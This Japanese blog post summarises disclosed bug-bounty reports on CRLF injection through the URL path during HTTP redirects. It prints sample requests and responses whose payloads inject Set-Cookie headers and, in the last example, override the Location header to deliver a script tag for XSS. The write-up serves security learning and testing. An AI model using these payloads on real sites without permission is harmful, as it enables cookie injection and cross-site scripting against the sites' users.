# Request-URIのパスからのCRLFインジェクション

<p class="modest" align="left">Feb 14, 2018</p>

---

ロシアのバグハンターであるSergey Bobrov氏（[@Black2Fan](https://twitter.com/Black2Fan)）が[HackerOneで公開しているレポート](https://hackerone.com/bobrov?sort_type=latest_disclosable_activity_at&filter=type%3Apublic&page=1&range=forever)を読んでいると、私が今まで認識しなかった方法でCRLFインジェクションを検出していた。後学のためにまとめておく。

## パラメータからのCRLFインジェクション

私が今まで行なっていた方法は、パラメータの値がレスポンスヘッダに出力される箇所で、値に改行コードを含めて確認するだけだった。値がSet-CookieヘッダやLocationヘッダに含まれるパラメータを対象に、[RFCでヘッダフィールドの終端として認められている](http://httpwg.org/specs/rfc7230.html#message.robustness) `CRLF`（%0D%0A）と `LF`（%0A）に加え、Firefoxを除く主要ブラウザ<sup id="f1">[¹](#fn1)</sup>で終端として扱われる `CR`（%0D）も含めて確認していた。具体的には以下のような動作である。

hxxp://example.jp/?l=en%0D%0ASet-Cookie:crlf=injection

```http
GET /?l=en%0D%0ASet-Cookie:crlf=injection HTTP/1.1
Host: example.jp
...
```

```http
HTTP/1.1 200 OK
Date: Sun, 11 Feb 2018 00:00:00 JST
Server: Apache
Set-Cookie: lang=en
Set-Cookie:crlf=injection
...
```

## パスからのCRLFインジェクション

Bobrov氏が行なっていたのは、30xリダイレクトが発生する箇所でRequest-URIのパスに改行コードを含め、Locationヘッダの出力を確認する方法だった。レポートのリダイレクト処理に注目すると以下のケースに分けられる。

- HTTPSへのリダイレクト
- 異なるホストへのリダイレクト
- トレイリングスラッシを削除するリダイレクト

各ケースでのCRLFインジェクションについてレポートを参考にまとめていく。

### HTTPSへのリダイレクト

HTTPSのページにHTTPで接続すると、HTTPSへのリダイレクトが発生する箇所でのケースである。その際のパスに改行コードを含めることで、Locationヘッダの出力で改行できる場合がある。以下は[Sucuriへのレポート](https://hackerone.com/reports/144769)を参考にした例である。

hxxp://support.example.net/%23%0DSet-Cookie:crlf=injection

```http
GET /%23%0DSet-Cookie:crlf=injection HTTP/1.1
Host: support.example.net
...
```

```http
HTTP/1.1 301 Moved Permanently
Date: Tue, 14 Jun 2016 19:56:14 GMT
Server: Apache
Location: https://support.example.net/#
Set-Cookie:crlf=injection
...
```

改行コードの手前に `#`（%23）を含めているのは、それ以降がフラグメントとして処理され、Locationヘッダに出力されたからだと考える。パスやクエリは出力しないようにしていた、または改行コードをエスケープして出力していたが、通常サーバに送信されないフラグメントは想定外だったのだろうか。

[Trelloへのレポート](https://hackerone.com/reports/45514)のようにHTTPSからHTTPへのリダイレクトという逆のケースもあった。

### 異なるホストへのリダイレクト

接続したホストから別のホスト、または特定のパスへリダイレクトする箇所でのケースである。以下は[ownCloudへのレポート](https://hackerone.com/reports/154306)を参考にした `api.example.org` から `doc.example.org/api/` へのリダイレクトでの例である。

hxxps://api.example.org/%23%0DSet-Cookie:crlf=injection

```http
GET /%23%0DSet-Cookie:crlf=injection HTTP/1.1
Host: api.example.org
...
```

```http
HTTP/1.1 301 Moved Permanently
Date: Wed, 27 Jul 2016 10:28:01 GMT
Server: Apache
Strict-Transport-Security: max-age=63072000
X-Xss-Protection: 1; mode=block
Location: https://doc.example.org/api/#
Set-Cookie:crlf=injection
...
```

過去に使われていたホストから現在のホストへの変更処理だろう。この他にも[Mail.Ruへのレポート](https://hackerone.com/reports/15492)のような `example.jp` から `example.jp/en/` への言語変更や、[Greenhouse.ioへのレポート](https://hackerone.com/reports/25275)のような `example.jp` から `www.example.jp` へのサブドメインの変更でも検出されている。

### トレイリングスラッシュを削除するリダイレクト

パスの末尾にある `/` を[トレイリングスラッシュ](https://webmasters.googleblog.com/2010/04/to-slash-or-not-to-slash.html)と呼ぶ。このトレイリングスラッシュがある場合は通常ディレクトリを指し、ない場合はコンテンツを指す。サイトによっては `/about/` のようなディレクトリの要求に対して、トレイリングスラッシュを削除して `/about` のようなコンテンツの要求へ変更する場合がある。以下は[Mail.Ruへのレポート](https://hackerone.com/reports/67386)を参考にしたトレイリングスラッシュを削除する際のリダイレクトでの例である。

hxxp://m.my.example.jp/crlftest%0DSet-Cookie:crlf=injection/

```http
GET /crlftest%0DSet-Cookie:crlf=injection/ HTTP/1.1
Host: m.my.example.jp
...
```

```http
HTTP/1.1 301 Moved Permanently
Server: nginx
Date: Sat, 11 Jun 2016 00:00:00 GMT
Content-Type: text/html
Location: http://m.my.example.jp/crlftest
Set-Cookie:crlf=injection
...
```

この例は `crlftest` という存在しないコンテンツを要求したケースだが、存在するコンテンツを要求した場合のみトレイリングスラッシュを削除する箇所もある。これとは逆にトレイリングスラッシュを追加する際にリダイレクトが発生する箇所もある。そのような箇所でもパスから改行コードを挿入できる可能性はある。

## CRLFインジェクションによるLocationヘッダの上書き

Bobrov氏のレポートのなかで[Starbucksへのレポート](https://hackerone.com/reports/192667)だけが、リダイレクトを止めてXSSにつなげていた。リダイレクトを止める方法はブラウザごとに異なるため、レポートではChromeとFirefoxのPoCを示している。以下はFirefoxの例である。

hxxp://stagecafrstore.example.com/%3F%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3A0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E

```http
GET /%3F%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3A0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: stagecafrstore.example.com
...
```

```http
HTTP/1.1 301 Content-moved
Date: Tue, 20 Dec 2016 08:40:11 GMT
Server: WebServer
X-Original-link: /%3F%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3A0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
X-XSS-Protection: 0
Location: //x:1
Content-Type: text/html
Content-Length: 98

<script>alert(document.domain)</script>
Content-Length: 0
X-OneLinkServiceType: onelink.fcgi
...
```

この例では `?`（%3F）と `CRLF`（%0D%0A）の後にLocationヘッダを挿入している点が興味深い。本来はHTTPSのページまたは異なるホストへのLocationヘッダが出力されていたが、CRLFインジェクションによってLocationヘッダを上書きできたのだろう<sup id="f2">[²](#fn2)</sup>。Locationヘッダを上書きしてリダイレクト先に `:1` のような[ブロック対象のポート](https://developer.mozilla.org/en-US/docs/Mozilla/Mozilla_Port_Blocking)を設定することで、リダイレクトを止めてレスポンスボディを表示させている<sup id="f3">[³](#fn3)</sup>。ChromeではLocationヘッダの値を空にすることでリダイレクトを止めていた。Request-URIのパスからのCRLFインジェクションでも、Locationヘッダを上書きできるケースはあるようだ。

## 所感

プログラム言語やフレームワークでの対策によって、CRLFインジェクションは作り込まれにくい脆弱性になったと考えていた。最近の診断でもほとんど見かけることはなかった。しかし、今回取り上げた事例は最近でも検出される場合があり、HackerOneでは他にもレポートが公開されている。Zeronights 2017の「[CRLF and OpenRedirect](https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies)」でも、この事例は取り上げられていた。これだけ検出されているのだから、今後バグバウンティの対象になるサイトでも検出されるだろう。スコープ内であれば認定される可能性が高い脆弱性なので狙い目だ。

---

¹ Chrome64、Safari11、Edge41、IE11は `CR` をヘッダフィールドの終端として扱っていた。  
<sup id="fn1">[¹](#f1)</sup> Chrome64、Safari11、Edge41、IE11は `CR` をヘッダフィールドの終端として扱っていた。  
<sup id="fn2">[²](#f2)</sup> 徳丸本のP.195「外部ドメインへのリダイレクト」にあるようなCGI特有の動作だと考える。  
<sup id="fn3">[³](#f3)</sup> はせがわさんが[ポートブロッキングを使う方法](http://d.hatena.ne.jp/hasegawayosuke/20161210/p1)をまとめている。
